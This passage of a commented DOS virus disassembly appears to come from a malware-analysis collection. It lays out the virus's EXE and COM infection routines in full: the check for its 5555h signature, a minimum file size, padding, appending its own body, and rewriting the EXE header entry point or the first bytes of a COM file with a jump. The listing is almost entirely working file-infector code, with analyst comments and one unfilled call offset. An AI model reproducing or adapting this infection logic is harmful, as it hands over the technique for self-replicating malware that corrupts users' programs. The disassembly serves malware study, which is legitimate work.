0680 C3            RET

0681 26 51     ; carrier SS
0683 00 02     ; carrier SP

;----------------------
; infect EXE file

0685 8BEC          MOV     BP,SP
0687 813E5B005555  CMP     WORD PTR [005B],5555 ; virus sygnature
068D 7501          JNZ     0690

068F C3            RET

0690 B80242        MOV     AX,4202   ; move file pointer to the end
0693 8B1E4801      MOV     BX,[0148] ; file handle
0697 33C9          XOR     CX,CX     ; to the end
0699 33D2          XOR     DX,DX
069B CD21          INT     21

069D 83FA00        CMP     DX,+00    ; file size above 64K?
06A0 7406          JZ      06A8      ; yes, infect

06A2 3D8813        CMP     AX,1388   ; minimum file length (5000 bytes)
06A5 7701          JA      06A8

06A7 C3            RET

; expand file length to paragraph border

06A8 50            PUSH    AX
06A9 25F0FF        AND     AX,FFF0    ; new length
06AC 051000        ADD     AX,0010    ; for garbage
06AF 83D200        ADC     DX,+00     ; adjust high word
06B2 B104          MOV     CL,04
06B4 D3E8          SHR     AX,CL      ; convert to paragraphs
06B6 B10C          MOV     CL,0C
06B8 D3E2          SHL     DX,CL
06BA 03D0          ADD     DX,AX      ; length of program in paragraphs
06BC 2B165100      SUB     DX,[0051]  ; header size
06C0 89163C01      MOV     [013C],DX  ; store it
06C4 58            POP     AX         ; restore low word of file length
06C5 52            PUSH    DX
06C6 250F00        AND     AX,000F    ; modulo 10h
06C9 BB1000        MOV     BX,0010    ; full paragraph
06CC 2BD8          SUB     BX,AX      ; should be added
06CE 53            PUSH    BX
06CF 891EFB00      MOV     [00FB],BX  ; number of bytes to write
06D3 E803FF        CALL    05D9       ; write file

06D6 7264          JB      073C

06D8 8B1E5D00      MOV     BX,[005D]   ; store IP
06DC 891E4201      MOV     [0142],BX
06E0 8B1E5F00      MOV     BX,[005F]   ; store CS
06E4 891E4401      MOV     [0144],BX
06E8 BA0000        MOV     DX,0000     ; start of virus code
06EB B9DB07        MOV     CX,07DB     ; length of virus
06EE 8B1E4801      MOV     BX,[0148]   ; file handle
06F2 B440          MOV     AH,40       ; write file
06F4 CD21          INT     21

06F6 7244          JB      073C        ; problems, exit

06F8 BA0000        MOV     DX,0000
06FB B90000        MOV     CX,0000
06FE E8C1FE        CALL    05C2       ; move file pointer from beginning

0701 5B            POP     BX         ; number of bytes added to file (1..16)
0702 5A            POP     DX         ; full file length in paragraphs
0703 C7065D000000  MOV     WORD PTR [005D],0000  ; new IP
0709 89165F00      MOV     [005F],DX  ; new CS
070D B8DB07        MOV     AX,07DB    ; virus length
0710 03C3          ADD     AX,BX      ; additional few bytes
0712 03064B00      ADD     AX,[004B]  ; last page
0716 50            PUSH    AX         ; store
0717 B109          MOV     CL,09      ; convert to 512 bytes pages
0719 D3E8          SHR     AX,CL
071B 01064D00      ADD     [004D],AX  ; store it
071F 58            POP     AX
0720 25FF01        AND     AX,01FF    ; adjust last page
0723 A34B00        MOV     [004B],AX
0726 C7065B005555  MOV     WORD PTR [005B],5555  ; virus sygnature
072C BA4900        MOV     DX,0049               ; buffer address
072F C706FB003000  MOV     WORD PTR [00FB],0030  ; number of bytes to write
0735 E8A1FE        CALL    05D9                  ; write file

0738 FF064A01      INC     WORD PTR [014A]  ; generation number
073C 8BE5          MOV     SP,BP
073E C3            RET

;-----------------
; infect COM file

073F 8BEC          MOV     BP,SP
0741 C706FB000600  MOV     WORD PTR [00FB],0006 ; number of bytes to wirte
0747 813E4D005555  CMP     WORD PTR [004D],5555 ; virus sygnature
074D 7501          JNZ     0750     ; not infected

074F C3            RET

; store oryginal first 6 bytes

0750 A14900        MOV     AX,[0049]
0753 A34201        MOV     [0142],AX
0756 A14B00        MOV     AX,[004B]
0759 A34401        MOV     [0144],AX
075C A14D00        MOV     AX,[004D]
075F A34601        MOV     [0146],AX

; get file length

0762 B90000        MOV     CX,0000
0765 BA0000        MOV     DX,0000
0768 8B1E4801      MOV     BX,[0148]  ; file handle
076C B80242        MOV     AX,4202    ; move file pointer to the end
076F CD21          INT     21

0771 83FA00        CMP     DX,+00     ; size below 64K?
0774 7705          JA      077B       ; ?? strange efect for COM file

0776 3D8813        CMP     AX,1388    ; minimum file size (5000 bytes)
0779 725D          JB      07D8       ; file too short, exit

077B 8BD8          MOV     BX,AX      ; low word of file size
077D 81C3EA07      ADD     BX,07EA    ; add virus code length + 0F
0781 7255          JB      07D8       ; file too big, exit

; expand file by 1 to 16 bytes to get file length multiple 16

0783 50            PUSH    AX
0784 BB1000        MOV     BX,0010
0787 250F00        AND     AX,000F    ; rest of file length
078A 2BD8          SUB     BX,AX      ; need to achive 10h multiple
078C 58            POP     AX
078D 03C3          ADD     AX,BX
078F 50            PUSH    AX         ; new length
0790 891EFB00      MOV     [00FB],BX  ; number of bytes to write
0794 E842FE        CALL    05D9       ; write file

0797 7304          JAE     079D       ; OK, continue

0799 58            POP     AX
079A EB3C          JMP     07D8       ; exit
079C 90            NOP

079D C706FB000600  MOV     WORD PTR [00FB],0006  ; number of bytes to write
07A3 BA0000        MOV     DX,0000    ; from DS:DX
07A6 B9DB07        MOV     CX,07DB    ; virus length
07A9 8B1E4801      MOV     BX,[0148]  ; file handle
07AD B440          MOV     AH,40      ; write file
07AF CD21          INT     21

07B1 7225          JB      07D8       ; problems, exit

07B3 BA0000        MOV     DX,0000
07B6 B90000        MOV     CX,0000
07B9 E806FE        CALL    05C2       ; move file pointer from beginning

; form new first 6 bytes 

07BC 58            POP     AX
07BD 2D0300        SUB     AX,0003
07C0 C6064900E9    MOV     BYTE PTR [0049],E9    ; code of JMP
07C5 A34A00        MOV     [004A],AX             ; offset
07C8 C7064D005555  MOV     WORD PTR [004D],5555  ; virus sygnature
07CE BA4900        MOV     DX,0049     ; address of buffer
07D1 E8xxxx        CALL    05D9        ; write file

07D4 FF064A01      INC     WORD PTR [014A]  ; virus show flag

07D8 8BE5          MOV     SP,BP
07DA C3            RET


07DC   DB     100h   dup (?)  ; stack
08DB                          ; top of stac
